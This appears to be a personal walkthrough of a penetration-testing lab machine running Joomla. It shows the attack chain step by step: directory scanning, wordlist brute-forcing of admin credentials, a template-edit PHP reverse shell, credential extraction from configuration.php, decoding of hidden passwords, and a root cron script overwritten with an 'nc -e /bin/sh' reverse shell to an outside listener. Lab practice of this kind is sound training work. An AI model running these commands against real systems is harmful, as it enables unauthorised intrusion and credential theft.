@@ -1,0 +1,94 @@
+nmap found port 22,80 open
+
+$ feroxbuster -u http://192.168.144.79 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,txt
+
+found login page 
+http://192.168.144.79/joomla/administrator/
+
+try all other method, cannot find vulnerable breakpoint.
+
+use Cewl to create a wordlist.
+cewl -m 5 -d 0 http://192.168.144.79/joomla/  > words.txt
+
+in burpsuite, use intruder set words.txt as payload. Then brute-force the credentials.
+Found credential joomla:Gotham
+
+login to admin page 
+in Templates: Customise (Protostar)
+found any file, edit to reverse_shell.php. 
+set up listener and request the .php file just uploaded.
+
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+enumerate and found configuration.php at 
+var/www/html/joomla/
+found inside have database credentials
+public $dbtype = 'mysqli';
+        public $host = 'localhost';
+        public $user = 'joomla';
+        public $password = 'babyjoker';
+        public $db = 'joomla_db';
+        public $dbprefix = 'jnqcu_';
+        public $live_site = '';
+        public $secret = 'fNRyp6KO51013435';
+the lab machine sql down. so I get user rob credentials from others walkthrough
+
+┌──(alan㉿kali)-[~/offseclabs]
+└─$ echo "Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/" | base64 -d
+???AllIHaveAreNegativeThoughts???                                                                                            
+┌──(alan㉿kali)-[~/offseclabs]
+└─$ ssh rob@192.168.144.79    
+rob@glasgowsmile:~$ cat Abnerineedyourhelp
+Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
+Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
+
+use cyberchef ROT13 rotate lowercase chars, rotate uppercase chars and Amount =1
+found base64, decode it and get below password for abner
+
+or https://www.cachesleuth.com/multidecoder/ for decode all info.
+
+STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==
+abner password: I33hope99my0death000makes44more8cents00than0my0life0
+
+upload pspy32s.
+run pspy and found 
+2026/04/14 04:41:01 CMD: UID=0     PID=9429   | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 
+
+~/SomeoneWhoHidesBehindAMask$ ls -la
+.trash_old
+
+echo "nc 192.168.45.161 8888 -e /bin/sh" > .trash_old
+
+get a root reverse_shell at port 8888 listener.
+─$ nc -nlvp 8888            
+listening on [any] 8888 ...
+connect to [192.168.45.161] from (UNKNOWN) [192.168.144.79] 48770
+id
+uid=0(root) gid=0(root) groups=0(root)
+pwd
+/root
+
+######################################################################################################
+The "Theme" Rule
+If a lab has a strong theme (Batman, Harry Potter, Vikings), CeWL is your best friend.
+
+Joomla specifics
+Joomla often stores configuration details in configuration.php. Once you get your shell, immediately cat that file.
+
+try mysql -u joomla -p -h 127.0.0.1 next time
+use -h 127.0.0.1 to specify the localhost.
+
+enumerate harder in subfolders
+find /var/www -name "*.zip" -o -name "*.txt" -o -name "*.bak" -o -name "*.sql" -o -name "*.config" 2>/dev/null
+or check recently modified files: (last 100days)
+find /var/www -mtime -100 -type f 2>/dev/null
+
+enumerate harder to find any file run in root privilege but writable
+find / -type f -name "*.sh" -user root -writable 2>/dev/null
+
+systemctl list-timers --all # show systemd timers, which not show in crontab.
+
+use pspy to check any schedule task, it may take some time, 5min+
+find where UID=0 (root) means run with root privilege
+
